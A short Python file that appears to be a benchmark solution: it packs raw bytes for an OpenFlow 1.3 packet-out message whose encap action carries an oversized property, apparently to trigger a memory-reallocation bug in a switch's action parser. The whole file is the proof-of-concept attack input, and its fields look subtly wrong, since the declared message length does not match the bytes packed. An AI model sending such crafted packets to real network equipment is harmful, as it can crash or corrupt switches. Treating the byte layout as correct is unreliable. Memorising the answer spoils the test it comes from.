import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # OpenFlow 1.3 packet-out message
        # Header: version(1), type(13), length(72), xid(0)
        header = struct.pack("!BBHI", 0x04, 13, 72, 0)
        
        # Packet-out: buffer_id(-1), in_port(0), actions_len(48)
        packet_out = struct.pack("!IIH", 0xffffffff, 0, 48) + b"\x00" * 6
        
        # NXAST_RAW_ENCAP action
        # type(0x0004), len(48), encap_type(1), pad(0)
        action = struct.pack("!HHHH", 0x0004, 48, 1, 0)
        
        # Property header that will trigger reallocation
        # class(0xffff), type(0xff), len(40)
        prop_header = struct.pack("!HHH", 0xffff, 0xff, 40)
        
        # Fill with data that causes reallocation
        # The remaining 40 bytes fill the property
        prop_data = b"\xff" * 40
        
        return header + packet_out + action + prop_header + prop_data